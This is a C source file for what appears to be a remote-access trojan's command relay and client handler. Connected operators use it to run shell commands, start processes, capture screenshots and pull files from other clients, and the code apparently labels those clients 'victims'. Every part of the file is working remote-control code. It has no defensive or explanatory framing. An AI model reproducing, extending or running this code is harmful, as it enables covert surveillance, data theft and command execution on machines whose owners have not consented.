#include <winsock2.h>

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "client.h"
#include "extract.h"
#include "sendMessage.h"
#include "ReadFile.h"
#include "Log.h"
#include "SCREENSHOT.h"

#include <time.h>

#define MAX_SCREENSHOT_SIZE (64 * 1024 * 1024)

extern Client clients[100];
extern int clientscount;
extern CRITICAL_SECTION clientsLock;

//int commandHelper(char* tmp, char* posVict, char* command, char* result) {
//
//}

int handleCommands(
    SOCKET clientSocket,
    char* username,
    char* buffer)
{
    char* extractedBuffer = extractBuffer(buffer);

    if (extractedBuffer == NULL)
        return 0;

    if (strcmp(extractedBuffer, "GETCLIENTS") == 0)
    {
        char response[4096] = "[SUCCESS] CLIENTLIST";

        EnterCriticalSection(&clientsLock);

        for (int i = 0; i < clientscount; i++) {
            strcat_s(response, sizeof(response), " ");
            strcat_s(response, sizeof(response), clients[i].username);
        }

        LeaveCriticalSection(&clientsLock);

        sendMessage(clientSocket, response, strlen(response));

        free(extractedBuffer);
        return 1;
    }

    char* posCom = extractFirstPart(extractedBuffer);

    if (posCom == NULL) {
        free(posCom);
        return 0;
    }

    if (strcmp(posCom, "SCREENSHOT") == 0) {
        char* opp = extractBuffer(extractedBuffer);

        if (opp == NULL) {
            free(posCom);
            free(extractedBuffer);
            return 1;
        }

        if (strcmp(opp, "SERVER_LISTENER") == 0) {

            sendScreenshot(clientSocket);

            free(opp);
            free(posCom);
            free(extractedBuffer);

            return 1;
        }
        else {
            Client* user = findUser(opp);

            if (user == NULL) {
                sendMessage(
                    clientSocket,
                    "USER NOT FOUND.",
                    sizeof("USER NOT FOUND.") - 1
                );
            }
            else {
                char message[256];

                snprintf(
                    message,
                    sizeof(message),
                    "-screenshot %s",
                    username
                );

                int result = sendMessage(
                    user->socket,
                    message,
                    (int)strlen(message)
                );

                if (result == SOCKET_ERROR) {
                    printf("[ERROR] Failed to send screenshot request\n");
                }
            }
        }

        free(opp);
        free(posCom);
        free(extractedBuffer);

        return 1;
    }

    if (strcmp(posCom, "get") == 0) {
        char* tmp = extractBuffer(extractedBuffer);

        if (tmp == NULL) {
            free(posCom);
            free(extractedBuffer);
            return 1;
        }

        char* posVict = extractFirstPart(tmp);

        if (posVict == NULL) {
            free(tmp);
            free(posCom);
            free(extractedBuffer);
            return 1;
        }

        char* filename = extractBuffer(tmp);

        if (filename == NULL) {
            free(posVict);
            free(tmp);
            free(posCom);
            free(extractedBuffer);
            return 1;
        }

        if (strcmp(posVict, "SERVER_LISTENER") == 0) {
            int res = sendFile(clientSocket, filename, "SERVER_LISTENER");

            if (res == 1) {
                static const char error[] = "[ERROR] Failed to transport a file.";
                sendMessage(clientSocket, error, sizeof(error) - 1);
            }
        }
        else {
            Client* user = findUser(posVict);

            if (user == NULL) {
                static const char error[] = "[ERROR] USER NOT FOUND";
                sendMessage(clientSocket, error, sizeof(error) - 1);
            }
            else {
                char answer[1024];

                int len = snprintf(
                    answer,
                    sizeof(answer),
                    "-get %s %s",
                    username,
                    filename
                );

                if (len >= 0 && len < sizeof(answer)) {
                    sendMessage(user->socket, answer, (size_t)len);
                }
            }
        }

        free(filename);
        free(posVict);
        free(tmp);
        free(posCom);
        free(extractedBuffer);

        return 1;
    }

    if(strcmp(posCom, "ssp") == 0)
    {
        char* tmp = extractBuffer(extractedBuffer);

        if (tmp != NULL)
        {
            char* posVict = extractFirstPart(tmp);

            if (posVict != NULL)
            {

                if (strcmp(posVict, "c0mrade") == 0 && strcmp(username, "c0mrade") != 0) {
                    static const char denied[] = "[ERROR] PERMISSION DENIED.";
                    static const char info[] = "[INFO] Command execution is restricted for this user.";

                    sendMessage(clientSocket, denied, sizeof(denied) - 1);
                    sendMessage(clientSocket, info, sizeof(info) - 1);

                    free(posVict);
                    free(tmp);
                    free(posCom);
                    free(extractedBuffer);
                    return 1;
                }
                if (strcmp(posVict, "SERVER_LISTENER") == 0)
                {
                    char* command = extractBuffer(tmp);

                    if (command != NULL)
                    {
						DWORD err = 0;
						DWORD pid = 0;

                        BOOL result = startsp(command, &pid, &err);

                        if (result) {
                            char message[128];

                            snprintf(message, sizeof(message),
                                "Process started successfully. PID: %lu", pid);

                            sendMessage(clientSocket, message, strlen(message));
                        }
                        else {
                            char message[128];

                            snprintf(message, sizeof(message),
                                "Process creation failed. Windows error: %lu", err);

                            sendMessage(clientSocket, message, strlen(message));
                        }

                        free(command);
                    }
                }
                else
                {

                    Client* user = findUser(posVict);

                    if (user == NULL) {
                        sendMessage(clientSocket, "[ERROR] USER NOT FOUND", sizeof("[ERROR] USER NOT FOUND"));
                        free(tmp);
                        free(posVict);
                        free(extractedBuffer);
                        return 1;
                    }

                    char* command = extractBuffer(tmp);

                    if (command != NULL)
                    {
                        char answer[1024] = "-ssp ";

                        strcat_s(answer, sizeof(answer), username);
                        strcat_s(answer, sizeof(answer), " ");
                        strcat_s(answer, sizeof(answer), command);

                        sendMessage(user->socket, answer, strlen(answer));
                        free(command);
                    }
                }
                free(posVict);
            }
            free(tmp);
        }
        free(posCom);
        free(extractedBuffer);
        return 1;
    }

    if (strcmp(posCom, "run") == 0)
    {
        char* tmp = extractBuffer(extractedBuffer);

        if (tmp != NULL)
        {
            char* posVict = extractFirstPart(tmp);

            if (posVict != NULL)
            {

                if (strcmp(posVict, "c0mrade") == 0 && strcmp(username, "c0mrade") != 0) {
                    static const char denied[] = "[ERROR] PERMISSION DENIED.";
                    static const char info[] = "[INFO] Command execution is restricted for this user.";

                    sendMessage(clientSocket, denied, sizeof(denied) - 1);
                    sendMessage(clientSocket, info, sizeof(info) - 1);

                    free(posVict);
                    free(tmp);
                    free(posCom);
                    free(extractedBuffer);
                    return 1;
                }
                if (strcmp(posVict, "SERVER_LISTENER") == 0)
                {
                    char* command = extractBuffer(tmp);

                    if (command != NULL)
                    {
                        char* result = execCommand(command);

                        if (result != NULL) {
                            sendMessage(clientSocket, result, strlen(result));
                        }

                        free(result);
                        free(command);
                    }
                }
                else
                {

                    Client *user = findUser(posVict);

                    if (user == NULL) {
                        sendMessage(clientSocket, "[ERROR] USER NOT FOUND", sizeof("[ERROR] USER NOT FOUND"));
                        free(tmp);
                        free(posVict);
                        free(extractedBuffer);
                        return 1;
                    }

                    char* command = extractBuffer(tmp);

                    if (command != NULL)
                    {
                        char answer[1024] = "-run ";

                        strcat_s(answer, sizeof(answer), username);
                        strcat_s(answer, sizeof(answer), " ");
                        strcat_s(answer, sizeof(answer), command);

                        sendMessage(user->socket, answer, strlen(answer));
                        free(command);
                    }
                }
                free(posVict);
            }
            free(tmp);
        }
        free(posCom);
        free(extractedBuffer);
        return 1;
    }
    free(posCom);
    free(extractedBuffer);
    return 0;
}


//Client Handle Function

int clientHandleFunc(SOCKET clientSocket, char* username, char* buffer, HANDLE hConsole)
{
    char* posCom = extractFirstPart(buffer);

    if (posCom == NULL) {
        free(posCom);
        return 0;
    }

if (strcmp(posCom, "-screenshot") == 0) {

    char* requester = extractBuffer(buffer);

    if (requester == NULL) {
        free(posCom);
        return 1;
    }

    //
    int width = 0;
    int height = 0;

    unsigned char* pixels = takeScreenshotPixels(&width, &height);

    if (pixels == NULL) {
        //printf("[ERROR] Screenshot capture failed\n");

        free(requester);
        free(posCom);
        return 1;
    }

    unsigned char* pngData = NULL;
    size_t pngSize = 0;

    int encodeResult = encodeScreenshotPNG(
        pixels,
        width,
        height,
        &pngData,
        &pngSize
    );

    free(pixels);

    if (!encodeResult || pngData == NULL ||
        pngSize == 0 || pngSize > INT_MAX) {

        free(pngData);
        free(requester);
        free(posCom);
        return 1;
    }

    // TODO: Send PNG to server

    // Prepare screenshot metadata
    char message[256];

    int messageLen = snprintf(
        message,
        sizeof(message),
        "SV1N_SCREENSHOT %s %zu",
        requester,
        pngSize
    );

    if (messageLen < 0 || messageLen >= sizeof(message)) {
        free(pngData);
        free(requester);
        free(posCom);
        return 1;
    }

    // Send metadata first
    int result = sendMessage(
        clientSocket,
        message,
        messageLen
    );

    if (result != messageLen) {
        printf("[ERROR] Failed to send screenshot metadata\n");

        free(pngData);
        free(requester);
        free(posCom);
        return 1;
    }

    // Send raw PNG
    result = sendAll(
        clientSocket,
        pngData,
        (int)pngSize
    );

    if (result != (int)pngSize) {
        printf("[ERROR] Failed to send PNG\n");
    }

    free(pngData);
    free(requester);
    free(posCom);

    return 1;
}

    if (strcmp(posCom, "-get") == 0) {

        char* tmp = extractBuffer(buffer);

        if (tmp == NULL) {
            free(posCom);
            return 1;
        }

        char* posOpp = extractFirstPart(tmp);
        char* filename = extractBuffer(tmp);

        if (posOpp != NULL && filename != NULL) {

            int res = sendFile(clientSocket, filename, posOpp);

            if (res == 1) {
                sendMessage(
                    clientSocket,
                    "[ERROR] Failed to transport a file.",
                    sizeof("[ERROR] Failed to transport a file.")
                );
            }
        }

        free(filename);
        free(posOpp);
        free(tmp);
        free(posCom);

        return 1;
    }


    if (strcmp(posCom, "SV1N_SCREENSHOT") == 0) {


        char* sizeStr = extractBuffer(buffer);

        if (sizeStr == NULL) {
            free(posCom);
            return 1;
        }

        char* endptr;
        unsigned long imageSize = strtoul(sizeStr, &endptr, 10);

        if (sizeStr == endptr ||
            *endptr != '\0' ||
            imageSize == 0 ||
            imageSize > INT_MAX ||
            imageSize > 50UL * 1024 * 1024) {

            logError("[ERROR] Invalid screenshot size\n", hConsole);

            free(sizeStr);
            free(posCom);
            return 1;
        }


        free(sizeStr);

        unsigned char* pngData = malloc((size_t)imageSize);

        if (pngData == NULL) {
            logError("[ERROR] Memory allocation failed\n", hConsole);
            free(posCom);
            return 1;
        }


        int result = recvAll(
            clientSocket,
            (char*)pngData,
            (int)imageSize
        );


        if (result != (int)imageSize) {
            logError("[ERROR] Failed to receive PNG\n", hConsole);

            free(pngData);
            free(posCom);
            return 1;
        }


        if (!saveScreenshotPNG(pngData, (size_t)imageSize)) {
            logError("[ERROR] Screenshot file saving failed\n", hConsole);
        }

        free(pngData);
        free(posCom);

        return 1;
    }


    if (strcmp(posCom, "SV1N_FILE_SEND1NG") == 0)
    {
        char* tmp = extractBuffer(buffer);

        if (tmp == NULL)
        {
            free(posCom);
            return 1;
        }

        //
        // Find the last space (separator before fileSize)
        char* separator = strrchr(tmp, ' ');

        if (separator == NULL)
        {
            free(tmp);
            free(posCom);
            return 1;
        }

        // Extract fileSize
        char* endptr;
        long fileSize = strtol(separator + 1, &endptr, 10);

        if (endptr == separator + 1 || *endptr != '\0' || fileSize < 0)
        {
            free(tmp);
            free(posCom);
            return 1;
        }
        //
        // Terminate string before fileSize
        *separator = '\0';

        // Everything before fileSize is filename
        char* filename = tmp;

        //
        FILE* file = NULL;
        errno_t err = fopen_s(&file, filename, "wb");

        if (err != 0 || file == NULL)
        {
            free(tmp);
            free(posCom);
            return 1;
        }

        char infoMessage[512];

        snprintf(infoMessage, sizeof(infoMessage), "[INFO] Receiving file %s (%ld bytes)", filename, fileSize);

        logInfo(infoMessage, hConsole);

        recvFile(
            clientSocket,
            file,
            fileSize
        );

        char message[512];

        snprintf(
            message,
            sizeof(message),
            "[SUCCESS] File %s received",
            filename
        );

        logSuccess(message, hConsole);

        free(tmp);
        free(posCom);

        return 1;
    }

    if (strcmp(posCom, "-ssp") == 0) {
		char* posOpp = extractFirstPart(buffer);
		char* command = extractBuffer(buffer);
        if (posOpp != NULL && command != NULL) {
            DWORD err = 0;
            DWORD pid = 0;

            BOOL result = startsp(command, &pid, &err);

            if (result) {
                char message[128];
                snprintf(message, sizeof(message), "SV1N_SSP %s Process started successfully. PID: %lu", posOpp, pid);
                sendMessage(clientSocket, message, strlen(message));
            }
            else {
                char message[128];
                snprintf(message, sizeof(message), "SV1N_SSP %s Process creation failed. Windows error: %lu", posOpp, err);
                sendMessage(clientSocket, message, strlen(message));
            }

            free(command);
            free(posOpp);
            free(posCom);
            return 1;
        }
    }

    if (strcmp(posCom, "-run") == 0) {

        char* tmp = extractBuffer(buffer);

        if (tmp == NULL) {
            free(posCom);
            return 1;
        }

        char* posOpp = extractFirstPart(tmp);
        char* command = extractBuffer(tmp);

        if (posOpp != NULL && command != NULL) {
            const char* comresult = NULL;

            comresult = execCommand(command);

            if (comresult == NULL) {
                free(command);
                free(posOpp);
                free(tmp);
                free(posCom);
                return 1;
            }

            size_t responseLength =
                strlen("SV1N_RUN_RESULT") +
                1 +
                strlen(posOpp) +
                1 +
                strlen(comresult);

            char* result = malloc(responseLength + 1);

            if (result != NULL) {
                snprintf(
                    result,
                    responseLength + 1,
                    "SV1N_RUN_RESULT %s %s",
                    posOpp,
                    comresult
                );

                sendMessage(clientSocket, result, responseLength);

                free(result);
            }
        }

    free(command);
    free(posOpp);
    free(tmp);
    free(posCom);

    return 1;
    }
    return 0;
}

//SERVER_RETRANSLATOR

int SERVER_RETRANSLATOR(char* buffer, SOCKET clientSocket) {
    char* posCom = extractFirstPart(buffer);
    if (posCom == NULL) {
        return 0;
    }

    if (strcmp(posCom, "SV1N_SSP") == 0) {
        char* tmp = extractBuffer(buffer);

        if (tmp == NULL) {
            free(posCom);
            return 0;
        }

        char* posOpp = extractFirstPart(tmp);

        if (posOpp == NULL) {
            free(tmp);
            free(posCom);
            return 0;
        }

        char* result = extractBuffer(tmp);

        if (result == NULL) {
            free(posOpp);
            free(tmp);
            free(posCom);
            return 0;
        }

        Client* user = findUser(posOpp);

        if (user != NULL) {
            sendMessage(user->socket, result, strlen(result));
        }

        free(result);
        free(posOpp);
        free(tmp);
        free(posCom);

        return 1;
    }

    if (strcmp(posCom, "SV1N_FILE_SEND1NG") == 0)
    {
        char* fields = extractBuffer(buffer);
        char* first = fields ? extractFirstPart(fields) : NULL;
        char* rest = fields ? extractBuffer(fields) : NULL;
        if (first == NULL || rest == NULL) {
            free(rest); free(first); free(fields); free(posCom);
            return 1;
        }

        char* filename = NULL;
        char* sizeStr = NULL;
        Client* user = NULL;
        char* endptr = NULL;
        long fileSize = strtol(rest, &endptr, 10);
        int uploadToServer = (endptr != rest && *endptr == '\0');

        if (uploadToServer) {
            // Client upload format: SV1N_FILE_SEND1NG <filename> <size>
            filename = _strdup(first);
            sizeStr = _strdup(rest);
        }
        else {
            // Client-to-client format: SV1N_FILE_SEND1NG <target> <filename> <size>
            user = findUser(first);
            filename = extractFirstPart(rest);
            sizeStr = filename ? extractBuffer(rest) : NULL;
            if (sizeStr != NULL) {
                endptr = NULL;
                fileSize = strtol(sizeStr, &endptr, 10);
                if (endptr == sizeStr || *endptr != '\0') fileSize = -1;
            }
        }

        if (filename == NULL || sizeStr == NULL || fileSize < 0) {
            free(sizeStr); free(filename); free(rest); free(first); free(fields); free(posCom);
            sendMessage(clientSocket, "[ERROR] Invalid file header", sizeof("[ERROR] Invalid file header") - 1);
            return 1;
        }

        char chunk[64000];
        long remaining = fileSize;
        int transferOk = 1;

        if (uploadToServer) {
            const char* baseName = filename;
            const char* slash = strrchr(filename, '/');
            const char* backslash = strrchr(filename, '\\');
            if (slash != NULL && slash + 1 > baseName) baseName = slash + 1;
            if (backslash != NULL && backslash + 1 > baseName) baseName = backslash + 1;

            FILE* output = NULL;
            if (*baseName == '\0' || fopen_s(&output, baseName, "wb") != 0 || output == NULL)
                transferOk = 0;

            while (remaining > 0) {
                int take = remaining > (long)sizeof(chunk) ? (int)sizeof(chunk) : (int)remaining;
                if (recvAll(clientSocket, chunk, take) != take) {
                    transferOk = 0;
                    break;
                }
                if (output != NULL && fwrite(chunk, 1, take, output) != (size_t)take)
                    transferOk = 0;
                remaining -= take;
            }

            if (output != NULL) fclose(output);
            if (remaining == 0 && transferOk) {
                char response[512];
                snprintf(response, sizeof(response), "[SUCCESS] File %s received", baseName);
                sendMessage(clientSocket, response, strlen(response));
            }
            else if (remaining == 0) {
                sendMessage(clientSocket, "[ERROR] Cannot save file", sizeof("[ERROR] Cannot save file") - 1);
            }
        }
        else if (user == NULL) {
            // Consume the payload even when the requested recipient is missing.
            while (remaining > 0) {
                int take = remaining > (long)sizeof(chunk) ? (int)sizeof(chunk) : (int)remaining;
                if (recvAll(clientSocket, chunk, take) != take) break;
                remaining -= take;
            }
            sendMessage(clientSocket, "[ERROR] USER NOT FOUND.", sizeof("[ERROR] USER NOT FOUND.") - 1);
        }
        else {
            char header[512];
            int headerLen = snprintf(header, sizeof(header), "SV1N_FILE_SEND1NG %s %ld", filename, fileSize);
            if (headerLen < 0 || headerLen >= (int)sizeof(header) || sendMessage(user->socket, header, (size_t)headerLen) == SOCKET_ERROR) {
                // Still consume the complete incoming payload to preserve framing.
                while (remaining > 0) {
                    int take = remaining > (long)sizeof(chunk) ? (int)sizeof(chunk) : (int)remaining;
                    if (recvAll(clientSocket, chunk, take) != take) break;
                    remaining -= take;
                }
            }
            else {
                while (remaining > 0) {
                    int take = remaining > (long)sizeof(chunk) ? (int)sizeof(chunk) : (int)remaining;
                    if (recvAll(clientSocket, chunk, take) != take) break;
                    remaining -= take;
                    if (sendAll(user->socket, chunk, take) != take) transferOk = 0;
                }
            }
        }

        free(sizeStr); free(filename); free(rest); free(first); free(fields); free(posCom);
        return 1;
    }
    if (strcmp(posCom, "SV1N_SCREENSHOT") == 0)
    {
        char* tmp = extractBuffer(buffer);

        if (tmp == NULL) {
            free(posCom);
            return 1;
        }

        char* target = extractFirstPart(tmp);

        if (target == NULL) {
            free(tmp);
            free(posCom);
            return 1;
        }

        Client* user = findUser(target);

        if (user == NULL) {
            sendMessage(
                clientSocket,
                "[ERROR] USER NOT FOUND.",
                sizeof("[ERROR] USER NOT FOUND.") - 1
            );

            free(target);
            free(tmp);
            free(posCom);
            return 1;
        }

        char* sizeStr = extractBuffer(tmp);

        if (sizeStr == NULL) {
            free(target);
            free(tmp);
            free(posCom);
            return 1;
        }

        char* endptr;

        unsigned long imageSize = strtoul(sizeStr, &endptr, 10);

        if (sizeStr == endptr ||
            *endptr != '\0' ||
            imageSize == 0 ||
            imageSize > INT_MAX ||
            imageSize > 50UL * 1024 * 1024)
        {
            printf("[ERROR] Invalid screenshot size\n");

            free(sizeStr);
            free(target);
            free(tmp);
            free(posCom);
            return 1;
        }

        // Forward header
        char header[256];

        int headerLen = snprintf(
            header,
            sizeof(header),
            "SV1N_SCREENSHOT %lu",
            imageSize
        );

        if (headerLen < 0 || headerLen >= sizeof(header)) {
            free(sizeStr);
            free(target);
            free(tmp);
            free(posCom);
            return 1;
        }

        if (sendMessage(
            user->socket,
            header,
            headerLen
        ) == SOCKET_ERROR)
        {
            printf("[ERROR] Failed to forward screenshot header\n");

            free(sizeStr);
            free(target);
            free(tmp);
            free(posCom);
            return 1;
        }

        // Relay PNG
        char chunk[64000];

        unsigned long remaining = imageSize;
        int transferSuccess = 1;

        while (remaining > 0)
        {
            int toRead = remaining > sizeof(chunk)
                ? sizeof(chunk)
                : (int)remaining;

            int bytesReceived = recv(
                clientSocket,
                chunk,
                toRead,
                0
            );

            if (bytesReceived <= 0) {
                printf("[ERROR] Failed to receive PNG data\n");
                transferSuccess = 0;
                break;
            }

            int bytesSent = sendAll(
                user->socket,
                chunk,
                bytesReceived
            );

            if (bytesSent != bytesReceived) {
                printf("[ERROR] Failed to forward PNG data\n");
                transferSuccess = 0;
                break;
            }

            remaining -= bytesReceived;
        }

        if (transferSuccess && remaining == 0) {
            printf("[SUCCESS] Screenshot relayed: %lu bytes\n", imageSize);
        }

        free(sizeStr);
        free(target);
        free(tmp);
        free(posCom);

        return 1;
    }

    if (strcmp(posCom, "SV1N_RUN_RESULT") == 0) {
        char* tmp = extractBuffer(buffer);
        if (tmp == NULL) {
            free(posCom);
            return 1;
        }

        char* opp = extractFirstPart(tmp);

        if (opp == NULL) {
            free(tmp);
            free(posCom);
            return 1;
        }

        Client* user = findUser(opp);

        if (user != NULL) {
            if (strcmp(user->username, opp) == 0) {
                char* result = extractBuffer(tmp);

                if (result == NULL) {
                    free(tmp);
                    free(opp);
                    free(posCom);
                    return 1;
                }

                sendMessage(user->socket, result, strlen(result));
                free(result);
            }
        }


        free(tmp);
        free(opp);
        free(posCom);
        return 1;
    }

    free(posCom);
    return 0;
}